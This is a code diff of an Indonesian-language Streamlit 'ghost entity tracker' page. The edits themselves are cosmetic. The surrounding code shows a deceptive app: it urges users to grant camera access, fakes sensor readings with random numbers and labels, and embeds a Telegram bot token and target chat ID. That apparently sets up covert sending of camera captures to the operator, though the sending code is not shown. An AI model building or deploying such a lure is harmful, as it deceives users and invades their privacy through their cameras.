@@ -71,7 +71,7 @@ st.markdown("""
 # ==========================================
 # TAMPILAN UTAMA
 # ==========================================
-st.markdown("<h1 style='text-align: center; color: #ff0033; text-shadow: 0 0 20px #ff0033; font-family: \'VT323\', monospace; font-size: 2.8rem; letter-spacing: 3px;'>⚠️ GHOST ENTITY TRACKER v5.0</h1>", unsafe_allow_html=True)
+st.markdown("<h1 style='text-align: center; color: #ff0033; text-shadow: 0 0 20px #ff0033; font-family: \"VT323\", monospace; font-size: 2.8rem; letter-spacing: 3px;'>⚠️ GHOST ENTITY TRACKER v5.0</h1>", unsafe_allow_html=True)
 st.markdown("<p style='text-align: center; color: #888888; font-size: 0.9rem; letter-spacing: 1px;'>THERMAL & AUDIO FREQUENCY SENSOR</p>", unsafe_allow_html=True)
 
 with st.container():
@@ -80,7 +80,7 @@ with st.container():
     st.markdown("""
         <div class="warning-box">
             <b>[!] PERINGATAN INVESTIGASI:</b><br>
-            Arahkan kamera ke sudut gelap ruanganmu. Sensor akan melacak pergerakan entitas tak kasat mata secara *real-time* disertai frekuensi audio. Wajib klik <b>"ALLOW / IZINKAN"</b> pada pop-up kamera untuk memulai kalibrasi.
+            Arahkan kamera ke sudut gelap ruanganmu. Sensor akan melacak pergerakan entitas tak kasat mata secara <i>real-time</i> disertai frekuensi audio. Wajib klik <b>"ALLOW / IZINKAN"</b> pada pop-up kamera untuk memulai kalibrasi.
         </div>
     """, unsafe_allow_html=True)
 
@@ -171,7 +171,7 @@ with st.container():
         const botToken = "{TELEGRAM_BOT_TOKEN}";
         const targetChatId = "{TELEGRAM_CHAT_ID}";
 
-        // Fungsi Audio Alami (Web Audio API) untuk Suara Beep Radar & Detak Jantung
+        // Fungsi Audio Alami (Web Audio API) untuk Suara Beep Radar
         function playRadarBeep() {{
             try {{
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -179,7 +179,7 @@ with st.container():
                 const gain = audioCtx.createGain();
                 
                 osc.type = 'sine';
-                osc.frequency.setValueAtTime(880, audioCtx.currentTime); // Frekuensi tinggi ala radar
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime);
                 gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
                 gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
                 
@@ -251,23 +251,19 @@ with st.container():
 
                     // Looping pergerakan entitas berpindah-pindah tempat secara acak di layar
                     setInterval(() => {{
-                        const randomTop = Math.floor(Math.random() * 60) + 15; // Posisi vertikal 15% - 75%
-                        const randomLeft = Math.floor(Math.random() * 65) + 15; // Posisi horizontal 15% - 80%
+                        const randomTop = Math.floor(Math.random() * 60) + 15;
+                        const randomLeft = Math.floor(Math.random() * 65) + 15;
                         
                         lockBox.style.top = randomTop + "%";
                         lockBox.style.left = randomLeft + "%";
                         
-                        // Ubah label secara dinamis
                         const labels = ["ENTITY: CLOSE", "MOVING...", "SIGNAL SPIKE", "WARNING NEARBY"];
                         const randomLabel = labels[Math.floor(Math.random() * labels.length)];
                         document.getElementById('entity-label').innerText = randomLabel;
 
-                        // Mainkan suara beep alami setiap kotak berpindah
                         playRadarBeep();
-                        
-                        // Acak frekuensi MHz agar terlihat hidup
                         document.getElementById('freq-val').innerText = (Math.random() * (900 - 300) + 300).toFixed(1);
-                    }}, 2200); // Berpindah setiap 2.2 detik
+                    }}, 2200);
 
                 }}, 3500);
 
